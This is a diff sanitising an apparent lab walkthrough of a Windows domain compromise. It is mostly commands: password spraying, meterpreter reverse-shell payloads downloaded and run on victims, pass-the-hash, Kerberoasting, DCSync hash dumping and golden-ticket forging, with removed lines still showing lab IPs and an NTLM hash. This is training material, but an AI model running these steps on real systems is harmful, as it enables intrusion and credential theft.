@@ -5,7 +5,7 @@ This gives us a large list of plaintext, with this we can exit box 1 (exit mimik
 
 FileShare Initial
 
-Place usernames and passwords into separate usernames.txt and passwords.txt file on your kali machine (http-admin, fileshare-user from mimikatz)
+Place usernames and passwords into separate usernames.txt and passwords.txt file on your kali machine (lab-web-admin, lab-user-a from mimikatz)
 
 kali CLI $ nano usernames.txt   (insert users one line at a time)
 
@@ -15,7 +15,7 @@ kali CLI $ nano targets.txt    (insert targets one line at a time)
 
 kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt --shares
 
-kali CLI $ impacket-smbclient demo/fileshare-user@10.0.1.200
+kali CLI $ impacket-smbclient example/lab-user-a@<lab-ip>
 
 kali smblcient $ shares
 
@@ -37,17 +37,17 @@ kali CLI $ hydra -L usernames.txt -P passwords.txt -M targets.txt -S rdp
 
 kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt -M rdp -o ACTION=enable
 
-kali CLI $ xfreerdp /d:lab.example /u:fileshare-admin /p:<lab-password> /v:10.0.1.200
+kali CLI $ xfreerdp /d:example.test /u:lab-admin /p:<lab-password> /v:<lab-ip>
 
 !!! If the user doesn’t have X, above will not work - can instead connect from the host where the VPN connection is initialised (mstsc, rdesktop, etc) !!!
 
-kali CLI $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.1.150 LPORT=443 EXITFUNC=thread -o runner.exe --platform windows -a x64 -f exe
+kali CLI $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lab-ip> LPORT=443 EXITFUNC=thread -o runner.exe --platform windows -a x64 -f exe
 
 kali CLI $ python3.9 -m http.server
 
 Now download the file the windows box over RDP by opening PowerShell and running the following command
 
-fileshare-admin PS $ wget http://10.0.1.150:8000/runner.exe -o runner.exe
+lab-admin PS $ wget http://<lab-ip>:8000/runner.exe -o runner.exe
 
 kali CLI $ msfconsole
 
@@ -57,11 +57,11 @@ MSF CLI $ set payload windows/x64/meterpreter/reverse_https
 
 MSF CLI $ set lport 443
 
-MSF CLI $ set lhost 10.0.1.150
+MSF CLI $ set lhost <lab-ip>
 
 MSF CLI $ run
 
-fileshare-admin PS $ ./runner.exe
+lab-admin PS $ ./runner.exe
 
 MSF CLI $ sysinfo
 
@@ -71,25 +71,25 @@ FileShare Priv esc
 
 meterpreter >  shell
 
-fileshare-admin cmd $ powershell
+lab-admin cmd $ powershell
 
-fileshare-admin PS $ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe -o winPEASx64.exe
+lab-admin PS $ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe -o winPEASx64.exe
 
-fileshare-admin PS $ ./winPEASx64.exe
+lab-admin PS $ ./winPEASx64.exe
 
-fileshare-admin PS $ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
+lab-admin PS $ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
 
-fileshare-admin PS $ Import-Module .\PowerUp.ps1
+lab-admin PS $ Import-Module .\PowerUp.ps1
 
-fileshare-admin PS $ Invoke-Allchecks
+lab-admin PS $ Invoke-Allchecks
 
-fileshare-admin PS $ Invoke-ServiceAbuse -Name 'MaintServ'
+lab-admin PS $ Invoke-ServiceAbuse -Name 'LabService'
 
-fileshare-admin PS $ start-process PowerShell -verb runas
+lab-admin PS $ start-process PowerShell -verb runas
 
-Auth with user .\lab-user and password <lab-password> You can do this over RDP by opening a new terminal, SSHing in to the Kali machine and running:
+Auth with user .\lab-user-b and password <lab-password> You can do this over RDP by opening a new terminal, SSHing in to the Kali machine and running:
 
-kali CLI $ xfreerdp /u:lab-user /p:<lab-password> /v:10.0.1.200
+kali CLI $ xfreerdp /u:lab-user-b /p:<lab-password> /v:<lab-ip>
 
 Once authenticated, exit the meterpreter shell in your original terminal by hitting ctrl+c and then using the exit command until you are back at your Kali box CLI, then run the following:
 
@@ -101,13 +101,13 @@ MSF CLI $ set payload windows/x64/meterpreter/reverse_https
 
 MSF CLI $ set lport 443
 
-MSF CLI $ set lhost 10.0.1.150
+MSF CLI $ set lhost <lab-ip>
 
 MSF CLI $ run
 
 In the open RDP session, run PowerShell as an administrator and run the following to open a new meterpreter shell
 
-lab-user PS $ C:\Users\fileshare-admin\runner.exe
+lab-user-b PS $ C:\Users\lab-admin\runner.exe
 
 Loot around but find nothing, return to Kali
 
@@ -119,17 +119,17 @@ Add the netntlm hash to the file ‘hash’
 
 kali CLI $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
 
-kali CLI $ xfreerdp /d:lab.example /u:BROADCASTER-ADMIN /p:<lab-password> /v:10.0.1.122
+kali CLI $ xfreerdp /d:example.test /u:LAB-ADMIN-B /p:<lab-password> /v:<lab-ip>
 
 !!! If the user doesn’t have X, above will not work - can instead connect from the host where the VPN connection is initialised (mstsc, rdesktop, etc) !!!
 
 Broadcaster Initial
 
-broadcaster-admin PS $ wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -o SharpHound.exe
+lab-admin-b PS $ wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -o SharpHound.exe
 
-broadcaster-admin PS $ .\SharpHound.exe --CollectionMethods Group,Trusts,LocalAdmin,RDP,ACL,Session
+lab-admin-b PS $ .\SharpHound.exe --CollectionMethods Group,Trusts,LocalAdmin,RDP,ACL,Session
 
-You will need to copy the output zip file from the broadcaster-admin machine to your kali machine (for example, by using a meterpreter shell like with ‘FileShare Initial’, or copy and pasting from RDP)
+You will need to copy the output zip file from the lab-admin-b machine to your kali machine (for example, by using a meterpreter shell like with ‘FileShare Initial’, or copy and pasting from RDP)
 
 kali CLI $ sudo neo4j start
 
@@ -141,13 +141,13 @@ Login to bloodhound using neo4j creds setup in previous step, then drag and drop
 
 Within bloodhound, can execute queries:
 
-Path from “BROADCASTER.DEMO.LAB” to “GENERICBOX.DEMO.LAB“ (GenericAll)
+Path from “LAB-HOST-B.EXAMPLE.TEST” to “LAB-HOST-C.EXAMPLE.TEST“ (GenericAll)
 
 Broadcaster Priv esc
 
 We already have admin from the previous exploitation, skip to the next section.
 
-GenericBox Initial
+LabHostC Initial
 
 
 
@@ -157,9 +157,9 @@ In the directory you generated runner.exe in previously, run:
 
 kali CLI $ python3.9 -m http.server
 
-While logged in as broadcaster-admin, run PowerShell as administrator and run the following
+While logged in as lab-admin-b, run PowerShell as administrator and run the following
 
-broadcaster-admin PS $ wget http://10.0.1.150:8000/runner.exe -o C:\runner.exe
+lab-admin-b PS $ wget http://<lab-ip>:8000/runner.exe -o C:\runner.exe
 
 kali CLI $ sudo msfconsole
 
@@ -169,11 +169,11 @@ MSF CLI $ set payload windows/x64/meterpreter/reverse_https
 
 MSF CLI $ set lport 443
 
-MSF CLI $ set lhost 10.0.1.150
+MSF CLI $ set lhost <lab-ip>
 
 MSF CLI $ run
 
-broadcaster-admin PS $ C:\runner.exe
+lab-admin-b PS $ C:\runner.exe
 
 !!! Run the above command as an administrator !!!
 
@@ -191,7 +191,7 @@ MSF CLI $ run -j
 
 MSF CLI $ sessions -i 1
 
-MSF CLI $ kiwi_cmd "sekurlsa::pth /user:BROADCASTER$ /domain:lab.example /ntlm:<lab-ntlm-hash> /run:C:\\runner.exe"
+MSF CLI $ kiwi_cmd "sekurlsa::pth /user:LAB-HOST-B$ /domain:example.test /ntlm:<lab-ntlm-hash> /run:C:\\runner.exe"
 
 MSF CLI $ background
 
@@ -199,23 +199,23 @@ MSF CLI $ sessions -i 2
 
 MSF CLI $ shell
 
-broadcaster-admin shell $ net group LittleOlGroup /domain
+lab-admin-b shell $ net group LabPrivilegedGroup /domain
 
-broadcaster-admin shell $ net group "LittleOlGroup" "fileshare-admin" /add /domain
+lab-admin-b shell $ net group "LabPrivilegedGroup" "lab-admin" /add /domain
 
-broadcaster-admin shell $ net group LittleOlGroup /domain
+lab-admin-b shell $ net group LabPrivilegedGroup /domain
 
-Above output should show that the user “fileshare-admin” has been added to the “LittleOlGroup”
+Above output should show that the user “lab-admin” has been added to the “LabPrivilegedGroup”
 
-kali CLI $ impacket-psexec 'demo/fileshare-admin:<lab-password>'@10.0.1.123
+kali CLI $ impacket-psexec 'example/lab-admin:<lab-password>'@<lab-ip>
 
-We now have admin on GenericBox, get a metasploit shell back as previously covered in the cheatsheet
+We now have admin on LabHostC, get a metasploit shell back as previously covered in the cheatsheet
 
-GenericBox Priv esc
+LabHostC Priv esc
 
 Already have local admin, skip to the next section
 
-DCBackupBox Initial
+LAB-BACKUP-HOST Initial
 
 MSF CLI $ shell
 
@@ -227,29 +227,29 @@ NT-AUTH PS $ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/ra
 
 NT-AUTH PS $ ./Rubeus.exe kerberoast /nowrap
 
-You’ll get allot of output here, the main things we are focused on are the svc_legacy-web account hash
+You’ll get allot of output here, the main things we are focused on are the lab-service-account account hash
 
 Grab the hash and put it in a local text file named kerb.txt
 
 kali CLI $ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
 
-We now have a new user, lets see if it can go anywhere new, add them to the previous usernames.txt (svc_legacy-web) and passwords.txt (<lab-password>) file
+We now have a new user, lets see if it can go anywhere new, add them to the previous usernames.txt (lab-service-account) and passwords.txt (<lab-password>) file
 
 kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt -M rdp -o ACTION=Enable
 
 kali CLI $ hydra -L usernames.txt -P passwords.txt -M targets.txt -S rdp
 
-We can see RDP access to DCBackupBox, RDP in and download the runner and return a meterpeter shell as usual.
+We can see RDP access to LAB-BACKUP-HOST, RDP in and download the runner and return a meterpeter shell as usual.
 
-xfreerdp /d:lab.example /u:svc_legacy-web /p:<lab-password> /v:10.0.1.124
+xfreerdp /d:example.test /u:lab-service-account /p:<lab-password> /v:<lab-ip>
 
 !!! If the user doesn’t have X, above will not work - can instead connect from the host where the VPN connection is initialised (mstsc, rdesktop, etc) !!!
 
-DCBackupBox Priv esc
+LAB-BACKUP-HOST Priv esc
 
-svc_legacy-web PS $ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe -o winPEASx64.exe
+lab-service-account PS $ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe -o winPEASx64.exe
 
-svc_legacy-web PS $ ./winPEASx64.exe
+lab-service-account PS $ ./winPEASx64.exe
 
 Noticed that the AlwaysInstallElevated key is set to 1, we can abuse this for admin. We’ll use an easy metasploit module for this, background your shell and run the following.
 
@@ -269,15 +269,15 @@ MSF CLI $ load kiwi
 
 MSF CLI $ creds_all
 
-Notice the dc-syncer account, grab their NTLM (b5c9174863de24c2a50e7c61a4ac061d)
+Notice the lab-sync-account account, grab their NTLM (<lab-ntlm-hash>)
 
 DC01 Initial
 
-kali CLI $ impacket-secretsdump -hashes ':b5c9174863de24c2a50e7c61a4ac061d' 'dc-syncer@10.0.1.100'
+kali CLI $ impacket-secretsdump -hashes ':<lab-ntlm-hash>' 'lab-sync-account@<lab-ip>'
 
 Grab all the valuable output (i.e., the krbtgt user’s hash), these are the hashes of everyone in the domain
 
-kali CLI $ impacket-psexec -hashes ':<lab-ntlm-hash>' 'domain-administrator@10.0.1.100'
+kali CLI $ impacket-psexec -hashes ':<lab-ntlm-hash>' 'lab-domain-admin@<lab-ip>'
 
 DC01 Priv esc
 
@@ -305,7 +305,7 @@ kali CLI $ impacket-ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_s
 
 For example:
 
-kali CLI $ impacket-ticketer -nthash <lab-ntlm-hash> -domain-sid S-1-5-21-3977036785-4258717721-12546100 -domain lab.example krbtgt
+kali CLI $ impacket-ticketer -nthash <lab-ntlm-hash> -domain-sid <lab-domain-sid> -domain example.test krbtgt
 
 !!! You can’t just copy and paste from above, need to add the ntlm hash and SID from your domain !!!
 
@@ -315,6 +315,6 @@ kali CLI $ export KRB5CCNAME=krbtgt.ccache
 
 kali CLI $ sudo nano /etc/hosts
 
-Input all the srv’s and their Ip addresses (i.e., 10.0.1.124 DCBackupBox)
+Input all the srv’s and their Ip addresses (i.e., <lab-ip> LAB-BACKUP-HOST)
 
 kali CLI $ impacket-psexec 'krbtgt@WebSrv' -no-pass -k
